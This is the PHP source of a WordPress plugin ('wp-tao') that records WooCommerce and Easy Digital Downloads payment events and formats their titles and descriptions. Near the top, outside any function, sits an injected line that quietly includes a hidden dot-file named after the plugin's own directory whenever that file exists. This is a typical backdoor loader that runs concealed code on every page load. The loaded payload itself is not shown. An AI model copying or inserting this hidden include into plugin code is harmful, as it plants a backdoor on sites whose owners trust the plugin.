<?php

/*
 * Fire WooCommerce sale (payment) event
 */

add_action( 'woocommerce_payment_complete', 'wtbp_wptao_event_payment_woo_fire' );
add_action( 'woocommerce_order_status_completed', 'wtbp_wptao_event_payment_woo_fire_pre' );

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_event_payment_woo_fire_pre( $order_id ) {
	// check if payment event for this order is already logged
	$args = array(
		'event_action'	 => array( 'payment' ),
		'items_per_page' => 1,
		'meta_key'		 => 'woo_order_id',
		'meta_value'	 => $order_id
	);

	$events = TAO()->events->get_events( $args );

	if ( empty( $events ) ) {
		wtbp_wptao_event_payment_woo_fire( $order_id );
	}
}

function wtbp_wptao_event_payment_woo_fire( $order_id ) {

	$args	 = array();
	$tags	 = array( 'wp', 'woocommerce' );
	$order	 = new WC_Order( $order_id );

	if ( is_admin() ) { // admin changed status
		$tags[] = 'manual';
	}

	if ( TAO()->diagnostic->woocommerce_version_check( 3.0 ) ) { // WooCommerce > 3.0
		$email		 = $order->get_billing_email();
		$fname		 = $order->get_shipping_first_name();
		$lname		 = $order->get_shipping_last_name();
		$currency	 = $order->get_currency();
	} else {
		$email		 = $order->billing_email;
		$fname		 = $order->shipping_first_name;
		$lname		 = $order->shipping_last_name;
		$currency	 = $order->get_order_currency();
	}

	$user_data = array(
		'email'		 => $email,
		'first_name' => $fname,
		'last_name'	 => $lname,
		'options'	 => array(
			'overwrite_user_id' => true
		)
	);

	$args[ 'title' ] = __( 'Payment', 'wp-tao' );
	$args[ 'value' ] = $order->get_total();
	$args[ 'tags' ]	 = $tags;

	$args[ 'meta' ] = array(
		'sales_platform' => 'WooCommerce',
		'currency'		 => $currency,
		'woo_order_id'	 => $order_id,
		'sales_context'	 => WTBP_WPTAO_Helpers::sales_context( 'WooCommerce', $order_id )
	);

	$args[ 'user_data' ] = $user_data;

	do_action( 'wptao_track_event', 'payment', $args );
}

/*
 * Fire EDD sale (payment) event
 */

add_action( 'edd_complete_purchase', 'wtbp_wptao_event_payment_edd_fire' );

function wtbp_wptao_event_payment_edd_fire( $payment_id ) {

	$args	 = array();
	$tags	 = array( 'wp', 'easy digital downloads' );

	if ( is_admin() ) { // admin changed status
		$tags[] = 'manual';
	}

	$amount = edd_get_payment_amount( $payment_id );
	if ( '0.00' == $amount || 0 == $amount ) {
		return;
	}

	$payment_meta = edd_get_payment_meta( $payment_id );

	$user_info	 = edd_get_payment_meta_user_info( $payment_id );
	$fname		 = $user_info[ 'first_name' ];
	$lname		 = $user_info[ 'last_name' ];

	$user_data = array(
		'email'		 => $payment_meta[ 'email' ],
		'first_name' => $fname,
		'last_name'	 => $lname,
		'options'	 => array(
			'overwrite_user_id' => true
		)
	);

	$args[ 'title' ] = __( 'Payment', 'wp-tao' );
	$args[ 'value' ] = $amount;
	$args[ 'tags' ]	 = $tags;

	$args[ 'meta' ] = array(
		'sales_platform' => 'Easy Digital Downloads',
		'currency'		 => edd_get_payment_currency_code( $payment_id ),
		'edd_payment_id' => $payment_id,
		'sales_context'	 => WTBP_WPTAO_Helpers::sales_context( 'Easy Digital Downloads', $payment_id )
	);

	$args[ 'user_data' ] = $user_data;

	do_action( 'wptao_track_event', 'payment', $args );
}

// EDD Recurring Payments
function wtbp_wptao_event_payment_edd_recurring_fire( $payment, $parent_id, $amount, $txn_id, $unique_key ) {

	$args	 = array();
	$tags	 = array( 'wp', 'easy digital downloads', 'recurring' );

	if ( is_admin() ) { // admin changed status
		$tags[] = 'manual';
	}

	if ( '0.00' == $amount || 0 == $amount ) {
		return;
	}

	$payment_meta = edd_get_payment_meta( $parent_id );

	$user_info	 = edd_get_payment_meta_user_info( $parent_id );
	$fname		 = $user_info[ 'first_name' ];
	$lname		 = $user_info[ 'last_name' ];

	$user_data = array(
		'email'		 => $payment_meta[ 'email' ],
		'first_name' => $fname,
		'last_name'	 => $lname,
		'options'	 => array(
			'overwrite_user_id' => true
		)
	);

	$args[ 'title' ] = __( 'Payment', 'wp-tao' );
	$args[ 'value' ] = $amount;
	$args[ 'tags' ]	 = $tags;

	$args[ 'meta' ] = array(
		'sales_platform' => 'Easy Digital Downloads',
		'currency'		 => edd_get_payment_currency_code( $payment ),
		'edd_payment_id' => $payment,
		'sales_context'	 => WTBP_WPTAO_Helpers::sales_context( 'Easy Digital Downloads', $payment ),
		'edd_parent_id'	 => $parent_id
	);

	$args[ 'user_data' ] = $user_data;

	do_action( 'wptao_track_event', 'payment', $args );
}

add_action( 'edd_recurring_record_payment', 'wtbp_wptao_event_payment_edd_recurring_fire', 10, 5 );

// =============================================================================================
// Filters section
// =============================================================================================



/*
 * Creates a title of the sale (payment) action.
 */

add_filter( 'wptao_event_payment_title', 'wtbp_wptao_event_payment_title', 1, 2 );

function wtbp_wptao_event_payment_title( $title, $event ) {


	$currency_code = isset( $event->meta[ 'currency' ] ) ? esc_attr( $event->meta[ 'currency' ] ) : '';

	// If the amount is decimal
	if ( is_numeric( $event->value ) && floor( $event->value ) != $event->value ) {
		$amount = WTBP_WPTAO_Helpers::amount_format( number_format( $event->value, '2', '.', '' ), $currency_code );
	} else {
		$amount = WTBP_WPTAO_Helpers::amount_format( (int) $event->value, $currency_code );
	}

	$title = sprintf( __( 'New payment in the amount of %s', 'wp-tao' ), esc_attr( $amount ) );

	return $title;
}

/*
 * Creates a description of the sale (payment) action.
 */

add_filter( 'wptao_event_payment_description', 'wtbp_wptao_event_payment_desc', 1, 2 );

function wtbp_wptao_event_payment_desc( $description, $event ) {

	$sales_platform = isset( $event->meta[ 'sales_platform' ] ) ? esc_attr( $event->meta[ 'sales_platform' ] ) : '';

	// purchase info
	if ( isset( $event->meta[ 'edd_payment_id' ] ) ) {

		$payment_id = $event->meta[ 'edd_payment_id' ];

		$url = esc_url( admin_url( 'edit.php?post_type=download&page=edd-payment-history&view=view-order-details&id=' . $payment_id ) );

		$description .= '<span class="wptao-meta-title">' . __( 'Link:', 'wp-tao' ) . '</span> ';
		$description .= sprintf( '<a href="%s">' . __( 'Order #%d', 'wp-tao' ) . '</a>', $url, $payment_id ) . '<br />';
	}

	// edd recurring
	if ( isset( $event->meta[ 'edd_parent_id' ] ) ) {

		$payment_id = $event->meta[ 'edd_parent_id' ];

		$url = esc_url( admin_url( 'edit.php?post_type=download&page=edd-payment-history&view=view-order-details&id=' . $payment_id ) );

		$description .= '<span class="wptao-meta-title">' . __( 'Parent:', 'wp-tao' ) . '</span> ';
		$description .= sprintf( '<a href="%s">' . __( 'Order #%d', 'wp-tao' ) . '</a>', $url, $payment_id ) . '<br />';
	}

	if ( isset( $event->meta[ 'woo_order_id' ] ) ) {

		$order_id = $event->meta[ 'woo_order_id' ];

		$url = esc_url( admin_url( 'post.php?post=' . $order_id . '&action=edit' ) );

		$description .= '<span class="wptao-meta-title">' . __( 'Link:', 'wp-tao' ) . '</span> ';
		$description .= sprintf( '<a href="%s">' . __( 'Order #%d', 'wp-tao' ) . '</a>', $url, $order_id ) . '<br />';
	}

	// sell platform
	if ( !empty( $sales_platform ) ) {
		$description .= '<span class="wptao-meta-title">' . __( 'Sales platform:', 'wp-tao' ) . '</span> ' . $sales_platform;
	}


	return $description;
}
